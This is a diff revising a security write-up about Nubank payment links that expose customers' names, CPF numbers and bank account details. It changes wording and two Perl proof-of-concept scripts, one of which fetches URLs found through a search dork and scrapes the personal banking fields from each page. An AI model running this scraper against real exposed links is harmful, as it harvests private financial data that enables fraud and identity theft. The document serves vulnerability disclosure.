@@ -35,7 +35,7 @@ I came across my full name, CPF, my bank account number and branch exposed witho
 
 Such URL is generated exclusively by the client in your application and it is also up to the client to define how and with whom to share each generated URL.
 
-Convinced to assess whether this was really possible, I decided to create a * dork * to try to find more of these URLs, this time exposed on the Internet and this was the result:
+Convinced to analyse whether this was really possible, I decided to create a * dork * to try to find more of these URLs, this time exposed on the Internet and this was the result:
 
 ![](/images/publications/research/nubank/google-dorks.png)
 
@@ -54,6 +54,7 @@ Convinced to demonstrate an impact of the abuse of this functionality, I decided
 ```perl
 #!/usr/bin/env perl
 
+use 5.018;
 use strict;
 use warnings;
 use WWW::Mechanize;
@@ -103,40 +104,36 @@ use 5.018;
 use strict;
 use warnings;
 use Mojo::DOM;
-use LWP::UserAgent;
+use Mojo::UserAgent;
 
 sub main {
-    my $urls = $ARGV[0];
+    my $urls_file = $ARGV[0];
 
-    if ($urls) {
-        open (my $endpoints, "<", $urls); 
+    if ($urls_file) {
+        open my $urls_filehandle, "<", $urls_file or die $!;
 
-        while (<$endpoints>) {
-            chomp ($_);
+        while (<$urls_filehandle>) {
+            chomp($_);
 
-            my $userAgent = LWP::UserAgent -> new();
-            my $request   = $userAgent -> get($_);
-            my $response  = $request -> content();
+            my $userAgent = Mojo::UserAgent -> new();
+            my $response  = $userAgent -> get($_) -> result();
 
-            if ($response) {
-                my $dom = Mojo::DOM -> new();
-                $dom -> parse($response);
+            if ($response -> is_success()) {
+                my $account = $response -> dom -> find("tr td") -> map("text") -> join(",");
 
-                my $account = $dom -> find("tr td") -> map("text") -> join(","); 
+                $account =~ s/Nome,//
+                && $account =~ s/CPF,//
+                && $account =~ s/Banco,//
+                && $account =~ s/Tipo da conta,//
+                && $account =~ s/Agência,//
+                && $account =~ s/Conta,//
+                && $account =~ s/Agência Métodos,//;
 
-                $account =~ s/Nome,// && 
-                $account =~ s/CPF,// &&
-                $account =~ s/Banco,// &&
-                $account =~ s/Tipo da conta,// &&
-                $account =~ s/Agência,// &&
-                $account =~ s/Conta,// &&
-                $account =~ s/Agência Métodos,//;
-                
                 say $account;
-            }        
+            }
         }
 
-        close ($endpoints);
+        close($urls_filehandle);
     }
 }
 
